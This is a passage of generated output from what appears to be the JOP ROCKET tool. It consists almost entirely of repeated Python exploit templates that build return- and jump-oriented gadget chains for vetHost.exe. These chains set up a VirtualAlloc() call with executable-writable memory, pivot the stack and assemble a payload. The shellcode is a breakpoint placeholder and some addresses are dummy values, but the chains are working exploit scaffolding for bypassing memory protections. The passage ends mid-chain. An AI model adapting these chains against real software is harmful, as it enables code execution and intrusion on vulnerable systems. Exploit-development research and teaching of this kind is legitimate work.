shellcode = '\xcc\xcc\xcc\xcc' # '\xcc' is a breakpoint.
nops = '\x90' * 1
padding = '\x41' * 1

payload = padding + rop_chain + jop_chain + vp_stack + nops + shellcode	# Payload set up may vary greatly

# This was created by the JOP ROCKET.


* * * * * * * * * * * * * * * * * * * * * * * * * * * *
# VirtualAlloc() JOP chain set up for functional gadgets ending in Jmp/Call EBX #3


import struct

def create_rop_chain():
	rop_gadgets = [
		0x11017549, # (base + 0x17549), # pop ebx # ret  # vetHost.exe   Load EBX with address for dispatcher gadget!
		0x11002746, # (base + 0x2746) # add eax, 0x12 # xor edx, edx # jmp dword ptr [eax] # vetHost.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with 14 bytes between dispatch table slots!
		0x11007353, # (base + 0x7353), # pop eax # add byte ptr [ecx], 0x11 # ret  # vetHost.exe Load EAX with address of dispatch table
		0xdeadbeef, # Address for your dispatcher table!
		 # JMP to dispatcher gadget; start the JOP!
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)



def create_jop_chain():
	jop_gadgets = [
	
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100362c, # (base + 0x362c), # pop ecx # add byte ptr [eax], al # add esp, 4 # mov ecx, 0xdeadbeef # jmp ebx # vetHost.exe  [0x8 bytes]** 0x8
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100362c, # (base + 0x362c), # pop ecx # add byte ptr [eax], al # add esp, 4 # mov ecx, 0xdeadbeef # jmp ebx # vetHost.exe  [0x8 bytes]** 0x10
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100362c, # (base + 0x362c), # pop ecx # add byte ptr [eax], al # add esp, 4 # mov ecx, 0xdeadbeef # jmp ebx # vetHost.exe  [0x8 bytes]** 0x18
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100362c, # (base + 0x362c), # pop ecx # add byte ptr [eax], al # add esp, 4 # mov ecx, 0xdeadbeef # jmp ebx # vetHost.exe  [0x8 bytes]** 0x20
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100362c, # (base + 0x362c), # pop ecx # add byte ptr [eax], al # add esp, 4 # mov ecx, 0xdeadbeef # jmp ebx # vetHost.exe  [0x8 bytes]** 0x28
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100362c, # (base + 0x362c), # pop ecx # add byte ptr [eax], al # add esp, 4 # mov ecx, 0xdeadbeef # jmp ebx # vetHost.exe  [0x8 bytes]** 0x30
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100362c, # (base + 0x362c), # pop ecx # add byte ptr [eax], al # add esp, 4 # mov ecx, 0xdeadbeef # jmp ebx # vetHost.exe  [0x8 bytes]** 0x38
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100362c, # (base + 0x362c), # pop ecx # add byte ptr [eax], al # add esp, 4 # mov ecx, 0xdeadbeef # jmp ebx # vetHost.exe  [0x8 bytes]** 0x40
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100362c, # (base + 0x362c), # pop ecx # add byte ptr [eax], al # add esp, 4 # mov ecx, 0xdeadbeef # jmp ebx # vetHost.exe  [0x8 bytes]** 0x48
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100362c, # (base + 0x362c), # pop ecx # add byte ptr [eax], al # add esp, 4 # mov ecx, 0xdeadbeef # jmp ebx # vetHost.exe  [0x8 bytes]** 0x50
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100362c, # (base + 0x362c), # pop ecx # add byte ptr [eax], al # add esp, 4 # mov ecx, 0xdeadbeef # jmp ebx # vetHost.exe  [0x8 bytes]** 0x58
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100362c, # (base + 0x362c), # pop ecx # add byte ptr [eax], al # add esp, 4 # mov ecx, 0xdeadbeef # jmp ebx # vetHost.exe  [0x8 bytes]** 0x60
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100362c, # (base + 0x362c), # pop ecx # add byte ptr [eax], al # add esp, 4 # mov ecx, 0xdeadbeef # jmp ebx # vetHost.exe  [0x8 bytes]** 0x68
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100362c, # (base + 0x362c), # pop ecx # add byte ptr [eax], al # add esp, 4 # mov ecx, 0xdeadbeef # jmp ebx # vetHost.exe  [0x8 bytes]** 0x70
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100362c, # (base + 0x362c), # pop ecx # add byte ptr [eax], al # add esp, 4 # mov ecx, 0xdeadbeef # jmp ebx # vetHost.exe  [0x8 bytes] 0x78
		# N----> STACK PIVOT TOTAL: 0x78 bytes
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013bb, # (base + 0x13bb), # pop eax # jmp esi # vetHost.exe # Set up pop for VP 		# Need 0 bytes filler, for what was done after pop eax
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100274b, # (base + 0x274b), # jmp dword ptr [eax] # vetHost.exe # JMP to ptr for VirtualAlloc
		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
	]
	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)

rop_chain=create_rop_chain()
jop_chain=create_jop_chain()

vp_stack = struct.pack('<L', 0xdeadc0de) # ptr -> VirtualAlloc()

vp_stack += struct.pack('<L', 0xdeadc0de) # Pointers to memcpy, wmemcpy not found # return address  <-- where you want it to return - here we are chaining it together with memcpy
vp_stack += struct.pack('<L', 0x00625000) # lpAddress  <-- Where you want to start modifying protection
vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
vp_stack += struct.pack('<L', 0x00001000) # flAllocationType <-- 100, MEM_COMMIT
vp_stack += struct.pack('<L', 0x00000040) # flProtect <--RWX, PAGE_EXECUTE_READWRITE
vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--where the execution jumps after memcpy()
vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--i.e. desination address for memcpy()
vp_stack += struct.pack('<L', 0xffffdddd) # memcpy() destination address--i.e. Source address for shellcode
vp_stack += struct.pack('<L', 0x00002000) # mempcpy() size parameter--size of shellcode 
#This is one possible VirtualAlloc() chain; other possibilities exist!

shellcode = '\xcc\xcc\xcc\xcc' # '\xcc' is a breakpoint.
nops = '\x90' * 1
padding = '\x41' * 1

payload = padding + rop_chain + jop_chain + vp_stack + nops + shellcode	# Payload set up may vary greatly

# This was created by the JOP ROCKET.


* * * * * * * * * * * * * * * * * * * * * * * * * * * *
# VirtualAlloc() JOP chain set up for functional gadgets ending in Jmp/Call EBX #4


import struct

def create_rop_chain():
	rop_gadgets = [
		0x11017549, # (base + 0x17549), # pop ebx # ret  # vetHost.exe   Load EBX with address for dispatcher gadget!
		0x11002746, # (base + 0x2746) # add eax, 0x12 # xor edx, edx # jmp dword ptr [eax] # vetHost.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with 14 bytes between dispatch table slots!
		0x11007353, # (base + 0x7353), # pop eax # add byte ptr [ecx], 0x11 # ret  # vetHost.exe Load EAX with address of dispatch table
		0xdeadbeef, # Address for your dispatcher table!
		 # JMP to dispatcher gadget; start the JOP!
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)



def create_jop_chain():
	jop_gadgets = [
	
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110034fe, # (base + 0x34fe), # pop edi # and edi, eax # pop eax # jmp ebx # vetHost.exe  [0x8 bytes]** 0x8
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110034fe, # (base + 0x34fe), # pop edi # and edi, eax # pop eax # jmp ebx # vetHost.exe  [0x8 bytes]** 0x10
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110034fe, # (base + 0x34fe), # pop edi # and edi, eax # pop eax # jmp ebx # vetHost.exe  [0x8 bytes]** 0x18
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110034fe, # (base + 0x34fe), # pop edi # and edi, eax # pop eax # jmp ebx # vetHost.exe  [0x8 bytes]** 0x20
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110034fe, # (base + 0x34fe), # pop edi # and edi, eax # pop eax # jmp ebx # vetHost.exe  [0x8 bytes]** 0x28
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110034fe, # (base + 0x34fe), # pop edi # and edi, eax # pop eax # jmp ebx # vetHost.exe  [0x8 bytes]** 0x30
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110034fe, # (base + 0x34fe), # pop edi # and edi, eax # pop eax # jmp ebx # vetHost.exe  [0x8 bytes]** 0x38
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110034fe, # (base + 0x34fe), # pop edi # and edi, eax # pop eax # jmp ebx # vetHost.exe  [0x8 bytes]** 0x40
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110034fe, # (base + 0x34fe), # pop edi # and edi, eax # pop eax # jmp ebx # vetHost.exe  [0x8 bytes]** 0x48
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110034fe, # (base + 0x34fe), # pop edi # and edi, eax # pop eax # jmp ebx # vetHost.exe  [0x8 bytes]** 0x50
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110034fe, # (base + 0x34fe), # pop edi # and edi, eax # pop eax # jmp ebx # vetHost.exe  [0x8 bytes]** 0x58
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110034fe, # (base + 0x34fe), # pop edi # and edi, eax # pop eax # jmp ebx # vetHost.exe  [0x8 bytes]** 0x60
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110034fe, # (base + 0x34fe), # pop edi # and edi, eax # pop eax # jmp ebx # vetHost.exe  [0x8 bytes]** 0x68
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110034fe, # (base + 0x34fe), # pop edi # and edi, eax # pop eax # jmp ebx # vetHost.exe  [0x8 bytes]** 0x70
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100256c, # (base + 0x256c), # add esp, 0x14 # xor eax, eax # pop edi # pop esi # jmp ebx # vetHost.exe  [0x1c bytes] 0x8c
		# N----> STACK PIVOT TOTAL: 0x8c bytes
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013bb, # (base + 0x13bb), # pop eax # jmp esi # vetHost.exe # Set up pop for VP 		# Need 0 bytes filler, for what was done after pop eax
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100274b, # (base + 0x274b), # jmp dword ptr [eax] # vetHost.exe # JMP to ptr for VirtualAlloc
		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
	]
	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)

rop_chain=create_rop_chain()
jop_chain=create_jop_chain()

vp_stack = struct.pack('<L', 0xdeadc0de) # ptr -> VirtualAlloc()

vp_stack += struct.pack('<L', 0xdeadc0de) # Pointers to memcpy, wmemcpy not found # return address  <-- where you want it to return - here we are chaining it together with memcpy
vp_stack += struct.pack('<L', 0x00625000) # lpAddress  <-- Where you want to start modifying protection
vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
vp_stack += struct.pack('<L', 0x00001000) # flAllocationType <-- 100, MEM_COMMIT
vp_stack += struct.pack('<L', 0x00000040) # flProtect <--RWX, PAGE_EXECUTE_READWRITE
vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--where the execution jumps after memcpy()
vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--i.e. desination address for memcpy()
vp_stack += struct.pack('<L', 0xffffdddd) # memcpy() destination address--i.e. Source address for shellcode
vp_stack += struct.pack('<L', 0x00002000) # mempcpy() size parameter--size of shellcode 
#This is one possible VirtualAlloc() chain; other possibilities exist!

shellcode = '\xcc\xcc\xcc\xcc' # '\xcc' is a breakpoint.
nops = '\x90' * 1
padding = '\x41' * 1

payload = padding + rop_chain + jop_chain + vp_stack + nops + shellcode	# Payload set up may vary greatly

# This was created by the JOP ROCKET.


* * * * * * * * * * * * * * * * * * * * * * * * * * * *
# VirtualAlloc() JOP chain set up for functional gadgets ending in Jmp/Call EBX #5


import struct

def create_rop_chain():
	rop_gadgets = [
		0x11017549, # (base + 0x17549), # pop ebx # ret  # vetHost.exe   Load EBX with address for dispatcher gadget!
		0x11002746, # (base + 0x2746) # add eax, 0x12 # xor edx, edx # jmp dword ptr [eax] # vetHost.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with 14 bytes between dispatch table slots!
		0x11007353, # (base + 0x7353), # pop eax # add byte ptr [ecx], 0x11 # ret  # vetHost.exe Load EAX with address of dispatch table
		0xdeadbeef, # Address for your dispatcher table!
		 # JMP to dispatcher gadget; start the JOP!
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)



def create_jop_chain():
	jop_gadgets = [
	
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110034fe, # (base + 0x34fe), # pop edi # and edi, eax # pop eax # jmp ebx # vetHost.exe  [0x8 bytes]** 0x8
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110034fe, # (base + 0x34fe), # pop edi # and edi, eax # pop eax # jmp ebx # vetHost.exe  [0x8 bytes]** 0x10
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110034fe, # (base + 0x34fe), # pop edi # and edi, eax # pop eax # jmp ebx # vetHost.exe  [0x8 bytes]** 0x18
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110034fe, # (base + 0x34fe), # pop edi # and edi, eax # pop eax # jmp ebx # vetHost.exe  [0x8 bytes]** 0x20
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110034fe, # (base + 0x34fe), # pop edi # and edi, eax # pop eax # jmp ebx # vetHost.exe  [0x8 bytes]** 0x28
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110034fe, # (base + 0x34fe), # pop edi # and edi, eax # pop eax # jmp ebx # vetHost.exe  [0x8 bytes]** 0x30
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110034fe, # (base + 0x34fe), # pop edi # and edi, eax # pop eax # jmp ebx # vetHost.exe  [0x8 bytes]** 0x38
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110034fe, # (base + 0x34fe), # pop edi # and edi, eax # pop eax # jmp ebx # vetHost.exe  [0x8 bytes]** 0x40
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110034fe, # (base + 0x34fe), # pop edi # and edi, eax # pop eax # jmp ebx # vetHost.exe  [0x8 bytes]** 0x48
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110034fe, # (base + 0x34fe), # pop edi # and edi, eax # pop eax # jmp ebx # vetHost.exe  [0x8 bytes]** 0x50
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110034fe, # (base + 0x34fe), # pop edi # and edi, eax # pop eax # jmp ebx # vetHost.exe  [0x8 bytes]** 0x58
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110034fe, # (base + 0x34fe), # pop edi # and edi, eax # pop eax # jmp ebx # vetHost.exe  [0x8 bytes]** 0x60
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110034fe, # (base + 0x34fe), # pop edi # and edi, eax # pop eax # jmp ebx # vetHost.exe  [0x8 bytes]** 0x68
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110034fe, # (base + 0x34fe), # pop edi # and edi, eax # pop eax # jmp ebx # vetHost.exe  [0x8 bytes]** 0x70
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110034fe, # (base + 0x34fe), # pop edi # and edi, eax # pop eax # jmp ebx # vetHost.exe  [0x8 bytes] 0x78
		# N----> STACK PIVOT TOTAL: 0x78 bytes
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013bb, # (base + 0x13bb), # pop eax # jmp esi # vetHost.exe # Set up pop for VP 		# Need 0 bytes filler, for what was done after pop eax
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100274b, # (base + 0x274b), # jmp dword ptr [eax] # vetHost.exe # JMP to ptr for VirtualAlloc
		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
	]
	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)

rop_chain=create_rop_chain()
jop_chain=create_jop_chain()

vp_stack = struct.pack('<L', 0xdeadc0de) # ptr -> VirtualAlloc()

vp_stack += struct.pack('<L', 0xdeadc0de) # Pointers to memcpy, wmemcpy not found # return address  <-- where you want it to return - here we are chaining it together with memcpy
vp_stack += struct.pack('<L', 0x00625000) # lpAddress  <-- Where you want to start modifying protection
vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
vp_stack += struct.pack('<L', 0x00001000) # flAllocationType <-- 100, MEM_COMMIT
vp_stack += struct.pack('<L', 0x00000040) # flProtect <--RWX, PAGE_EXECUTE_READWRITE
vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--where the execution jumps after memcpy()
vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--i.e. desination address for memcpy()
vp_stack += struct.pack('<L', 0xffffdddd) # memcpy() destination address--i.e. Source address for shellcode
vp_stack += struct.pack('<L', 0x00002000) # mempcpy() size parameter--size of shellcode 
#This is one possible VirtualAlloc() chain; other possibilities exist!

shellcode = '\xcc\xcc\xcc\xcc' # '\xcc' is a breakpoint.
nops = '\x90' * 1
padding = '\x41' * 1

payload = padding + rop_chain + jop_chain + vp_stack + nops + shellcode	# Payload set up may vary greatly

# This was created by the JOP ROCKET.


* * * * * * * * * * * * * * * * * * * * * * * * * * * *
# VirtualAlloc() JOP chain set up for functional gadgets ending in Jmp/Call ECX #1


import struct

def create_rop_chain():
	rop_gadgets = [
		0x11013e52, # (base + 0x13e52), # pop ecx # ret  # vetHost.exe   Load ECX with address for dispatcher gadget!
		0x11002746, # (base + 0x2746) # add eax, 0x12 # xor edx, edx # jmp dword ptr [eax] # vetHost.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with 14 bytes between dispatch table slots!
		0x11007353, # (base + 0x7353), # pop eax # add byte ptr [ecx], 0x11 # ret  # vetHost.exe Load EAX with address of dispatch table
		0xdeadbeef, # Address for your dispatcher table!
		 # JMP to dispatcher gadget; start the JOP!
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)



def create_jop_chain():
	jop_gadgets = [
	
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c59, # (base + 0x1c59), # add esp, 0xc # xor eax, eax # pop esi # pop ebx # jmp ecx # vetHost.exe  [0x14 bytes]** 0x14
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c59, # (base + 0x1c59), # add esp, 0xc # xor eax, eax # pop esi # pop ebx # jmp ecx # vetHost.exe  [0x14 bytes]** 0x28
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c59, # (base + 0x1c59), # add esp, 0xc # xor eax, eax # pop esi # pop ebx # jmp ecx # vetHost.exe  [0x14 bytes]** 0x3c
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c59, # (base + 0x1c59), # add esp, 0xc # xor eax, eax # pop esi # pop ebx # jmp ecx # vetHost.exe  [0x14 bytes]** 0x50
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c59, # (base + 0x1c59), # add esp, 0xc # xor eax, eax # pop esi # pop ebx # jmp ecx # vetHost.exe  [0x14 bytes]** 0x64
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c59, # (base + 0x1c59), # add esp, 0xc # xor eax, eax # pop esi # pop ebx # jmp ecx # vetHost.exe  [0x14 bytes] 0x78
		# N----> STACK PIVOT TOTAL: 0x78 bytes
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013bb, # (base + 0x13bb), # pop eax # jmp esi # vetHost.exe # Set up pop for VP 		# Need 0 bytes filler, for what was done after pop eax
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100274b, # (base + 0x274b), # jmp dword ptr [eax] # vetHost.exe # JMP to ptr for VirtualAlloc
		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
	]
	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)

rop_chain=create_rop_chain()
jop_chain=create_jop_chain()

vp_stack = struct.pack('<L', 0xdeadc0de) # ptr -> VirtualAlloc()

vp_stack += struct.pack('<L', 0xdeadc0de) # Pointers to memcpy, wmemcpy not found # return address  <-- where you want it to return - here we are chaining it together with memcpy
vp_stack += struct.pack('<L', 0x00625000) # lpAddress  <-- Where you want to start modifying protection
vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
vp_stack += struct.pack('<L', 0x00001000) # flAllocationType <-- 100, MEM_COMMIT
vp_stack += struct.pack('<L', 0x00000040) # flProtect <--RWX, PAGE_EXECUTE_READWRITE
vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--where the execution jumps after memcpy()
vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--i.e. desination address for memcpy()
vp_stack += struct.pack('<L', 0xffffdddd) # memcpy() destination address--i.e. Source address for shellcode
vp_stack += struct.pack('<L', 0x00002000) # mempcpy() size parameter--size of shellcode 
#This is one possible VirtualAlloc() chain; other possibilities exist!

shellcode = '\xcc\xcc\xcc\xcc' # '\xcc' is a breakpoint.
nops = '\x90' * 1
padding = '\x41' * 1

payload = padding + rop_chain + jop_chain + vp_stack + nops + shellcode	# Payload set up may vary greatly

# This was created by the JOP ROCKET.


* * * * * * * * * * * * * * * * * * * * * * * * * * * *
# VirtualAlloc() JOP chain set up for functional gadgets ending in Jmp/Call ECX #2


import struct

def create_rop_chain():
	rop_gadgets = [
		0x11013e52, # (base + 0x13e52), # pop ecx # ret  # vetHost.exe   Load ECX with address for dispatcher gadget!
		0x11002746, # (base + 0x2746) # add eax, 0x12 # xor edx, edx # jmp dword ptr [eax] # vetHost.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with 14 bytes between dispatch table slots!
		0x11007353, # (base + 0x7353), # pop eax # add byte ptr [ecx], 0x11 # ret  # vetHost.exe Load EAX with address of dispatch table
		0xdeadbeef, # Address for your dispatcher table!
		 # JMP to dispatcher gadget; start the JOP!
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)



def create_jop_chain():
	jop_gadgets = [
	
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11003193, # (base + 0x3193), # add esp, 0x10 # mov eax, 0x10024c38 # jmp ecx # vetHost.exe  [0x10 bytes]** 0x10
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11003193, # (base + 0x3193), # add esp, 0x10 # mov eax, 0x10024c38 # jmp ecx # vetHost.exe  [0x10 bytes]** 0x20
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11003193, # (base + 0x3193), # add esp, 0x10 # mov eax, 0x10024c38 # jmp ecx # vetHost.exe  [0x10 bytes]** 0x30
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11003193, # (base + 0x3193), # add esp, 0x10 # mov eax, 0x10024c38 # jmp ecx # vetHost.exe  [0x10 bytes]** 0x40
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11003193, # (base + 0x3193), # add esp, 0x10 # mov eax, 0x10024c38 # jmp ecx # vetHost.exe  [0x10 bytes]** 0x50
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11003193, # (base + 0x3193), # add esp, 0x10 # mov eax, 0x10024c38 # jmp ecx # vetHost.exe  [0x10 bytes]** 0x60
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11003193, # (base + 0x3193), # add esp, 0x10 # mov eax, 0x10024c38 # jmp ecx # vetHost.exe  [0x10 bytes]** 0x70
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001c59, # (base + 0x1c59), # add esp, 0xc # xor eax, eax # pop esi # pop ebx # jmp ecx # vetHost.exe  [0x14 bytes] 0x84
		# N----> STACK PIVOT TOTAL: 0x84 bytes
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x110013bb, # (base + 0x13bb), # pop eax # jmp esi # vetHost.exe # Set up pop for VP 		# Need 0 bytes filler, for what was done after pop eax
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x1100274b, # (base + 0x274b), # jmp dword ptr [eax] # vetHost.exe # JMP to ptr for VirtualAlloc
		# JOP Chain gadgets are checked *only* to generate the desired stack pivot
	]
	return ''.join(struct.pack('<I', _) for _ in jop_gadgets)

rop_chain=create_rop_chain()
jop_chain=create_jop_chain()

vp_stack = struct.pack('<L', 0xdeadc0de) # ptr -> VirtualAlloc()

vp_stack += struct.pack('<L', 0xdeadc0de) # Pointers to memcpy, wmemcpy not found # return address  <-- where you want it to return - here we are chaining it together with memcpy
vp_stack += struct.pack('<L', 0x00625000) # lpAddress  <-- Where you want to start modifying protection
vp_stack += struct.pack('<L', 0x000003e8) # dwsize  <-- Size: 1000
vp_stack += struct.pack('<L', 0x00001000) # flAllocationType <-- 100, MEM_COMMIT
vp_stack += struct.pack('<L', 0x00000040) # flProtect <--RWX, PAGE_EXECUTE_READWRITE
vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--where the execution jumps after memcpy()
vp_stack += struct.pack('<L', 0x00625000) # *Same* address as lpAddress--i.e. desination address for memcpy()
vp_stack += struct.pack('<L', 0xffffdddd) # memcpy() destination address--i.e. Source address for shellcode
vp_stack += struct.pack('<L', 0x00002000) # mempcpy() size parameter--size of shellcode 
#This is one possible VirtualAlloc() chain; other possibilities exist!

shellcode = '\xcc\xcc\xcc\xcc' # '\xcc' is a breakpoint.
nops = '\x90' * 1
padding = '\x41' * 1

payload = padding + rop_chain + jop_chain + vp_stack + nops + shellcode	# Payload set up may vary greatly

# This was created by the JOP ROCKET.


* * * * * * * * * * * * * * * * * * * * * * * * * * * *
# VirtualAlloc() JOP chain set up for functional gadgets ending in Jmp/Call ECX #3


import struct

def create_rop_chain():
	rop_gadgets = [
		0x11013e52, # (base + 0x13e52), # pop ecx # ret  # vetHost.exe   Load ECX with address for dispatcher gadget!
		0x11002746, # (base + 0x2746) # add eax, 0x12 # xor edx, edx # jmp dword ptr [eax] # vetHost.exe 	#This is one possible dispatcher gadget, which may or may not be viable, with 14 bytes between dispatch table slots!
		0x11007353, # (base + 0x7353), # pop eax # add byte ptr [ecx], 0x11 # ret  # vetHost.exe Load EAX with address of dispatch table
		0xdeadbeef, # Address for your dispatcher table!
		 # JMP to dispatcher gadget; start the JOP!
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)



def create_jop_chain():
	jop_gadgets = [
	
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001285, # (base + 0x1285), # pop edi # pop esi # pop ebp # jmp ecx # vetHost.exe  [0xc bytes]** 0xc
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001285, # (base + 0x1285), # pop edi # pop esi # pop ebp # jmp ecx # vetHost.exe  [0xc bytes]** 0x18
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001285, # (base + 0x1285), # pop edi # pop esi # pop ebp # jmp ecx # vetHost.exe  [0xc bytes]** 0x24
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001285, # (base + 0x1285), # pop edi # pop esi # pop ebp # jmp ecx # vetHost.exe  [0xc bytes]** 0x30
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001285, # (base + 0x1285), # pop edi # pop esi # pop ebp # jmp ecx # vetHost.exe  [0xc bytes]** 0x3c
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
		0x11001285, # (base + 0x1285), # pop edi # pop esi # pop ebp # jmp ecx # vetHost.exe  [0xc bytes]** 0x48
		0x42424242, 0x42424242, 0x42424242, 0x4343,	# padding  (0xe bytes)
